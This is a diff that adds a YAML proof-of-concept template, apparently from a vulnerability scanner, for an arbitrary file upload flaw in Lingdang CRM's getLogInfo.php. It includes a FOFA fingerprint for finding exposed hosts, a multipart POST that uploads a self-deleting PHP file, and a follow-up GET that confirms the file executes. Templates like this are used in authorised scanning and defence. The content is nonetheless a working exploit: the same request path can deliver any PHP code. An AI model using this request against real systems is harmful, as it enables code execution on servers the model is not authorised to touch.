@@ -1,0 +1,40 @@
+id: poc-yaml-51mis-crm-getloginfo-php-anyfile-upload
+info:
+  name: 灵当CRM getLogInfo.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js"
+variables:
+  t1: random_int(100,100000)
+  t2: concat("uploadfile",str(t1),".php......")
+  t3: md5(t1)
+  t4: md5(t2)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: datetime("02")
+requests:
+- method: POST
+  path: /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename={{.t1}}.php......&callednumber=&sessionvalue={{.t4}}
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="uploaded_file"; filename="798.avi"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"success")
+
+    '
+- method: GET
+  path: /crm/storage/mobilecalllog/{{.dt1}}/{{.dt2}}/{{.dt3}}/{{.t1}}.php
+  expression: status_code == 200 && body == t3
+transport: http
